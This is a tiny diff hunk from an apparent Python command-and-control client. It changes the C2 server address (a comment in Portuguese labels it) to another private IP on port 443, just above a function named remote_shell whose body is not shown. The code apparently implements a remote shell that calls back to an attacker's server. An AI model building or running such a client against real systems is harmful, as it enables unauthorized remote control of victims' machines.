@@ -8,7 +8,7 @@ import time
 import threading
 
 # Endereço do servidor C2 e porta
-C2_HOST = "192.168.15.52"
+C2_HOST = "172.16.254.251"
 C2_PORT = 443
 
 def remote_shell():
